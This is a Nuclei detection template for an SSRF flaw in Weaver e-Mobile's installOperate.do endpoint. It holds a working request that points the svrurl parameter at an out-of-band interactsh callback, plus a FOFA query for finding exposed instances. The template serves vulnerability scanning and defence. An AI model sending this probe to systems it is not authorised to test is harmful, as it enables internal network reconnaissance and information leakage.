id: weaver-emobile-installOperate-ssrf

info:
  name: Weaver e-Mobile installOperate.do SSRF
  author: leadlife
  severity: high
  description: 泛微E-Mobile installOperate.do 接口存在服务器请求伪造（SSRF）漏洞，攻击者可以通过该漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。
  metadata:
    verified: true
    fofa-query: app="泛微-EMobile" && icon_hash="1578525679"
  tags: weaver,srf,emobile,oa,oob

http:
  - method: GET
    path:
      - "{{BaseURL}}/install/installOperate.do?svrurl=http://{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
